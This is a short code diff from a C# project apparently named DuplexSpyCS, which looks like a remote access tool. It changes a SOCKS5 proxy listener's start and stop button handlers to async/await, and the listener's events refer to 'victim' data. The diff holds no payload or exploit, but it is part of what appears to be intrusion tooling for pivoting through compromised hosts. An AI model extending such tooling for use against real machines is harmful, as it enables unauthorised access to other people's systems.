@@ -5,6 +5,7 @@ using System.Data;
 using System.Drawing;
 using System.Globalization;
 using System.Linq;
+using System.Net.Sockets;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
@@ -163,7 +164,7 @@ namespace DuplexSpyCS
             toolStripTextBox1.Text = nValue.ToString();
         }
 
-        private void toolStripButton1_Click(object sender, EventArgs e)
+        private async void toolStripButton1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -197,7 +198,7 @@ namespace DuplexSpyCS
                 m_ltnSocks5.OnRecvVictimData += fnOnProxyData;
                 m_ltnSocks5.OnProxyClosed += fnOnProxyClosed;
 
-                m_ltnSocks5.fnStart();
+                await m_ltnSocks5.fnStart();
 
                 fnLogs("Listener has been started successfully.");
             }
@@ -208,7 +209,7 @@ namespace DuplexSpyCS
             }
         }
 
-        private void toolStripButton3_Click(object sender, EventArgs e)
+        private async void toolStripButton3_Click(object sender, EventArgs e)
         {
             if (m_ltnSocks5 == null || !m_ltnSocks5.m_bIsRunning)
                 return;
@@ -219,7 +220,7 @@ namespace DuplexSpyCS
                 m_ltnSocks5.OnRecvVictimData -= fnOnProxyData;
                 m_ltnSocks5.OnProxyClosed -= fnOnProxyClosed;
 
-                m_ltnSocks5.fnStop();
+                await m_ltnSocks5.fnStop();
 
                 fnLogs("Listener has been stopped successfully.");
             }
